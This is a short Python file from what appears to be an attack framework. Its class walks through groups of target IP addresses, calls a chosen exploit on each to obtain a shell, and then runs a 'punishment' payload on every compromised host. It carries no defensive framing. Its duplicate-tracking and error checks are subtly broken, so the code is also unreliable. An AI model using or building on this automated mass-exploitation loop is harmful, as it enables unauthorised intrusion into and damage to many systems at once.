import exploit_cl
import payload_cl

# Collection of ip addresses to be attacked

class TargetClctn(object):
	def __init__(self, os_group):
		self.os_group = os_group

	def run_routine(self, args, method, punishment,groups):
		used_ips = []
		# iterate through all ips in selected groups
		for i in groups:
			for ip in self.os_group[i]:
				if ip not in used_ips:
					shell = getattr(exploit_cl,method)(ip,args) # execute exploit
					if type(shell) != Exception: # make sure the shell exists
						getattr(payload_cl,punishment['type'])(shell).execute_payload()
						shell.close()
					used_ips += ip # add up to list of checked ips
		return


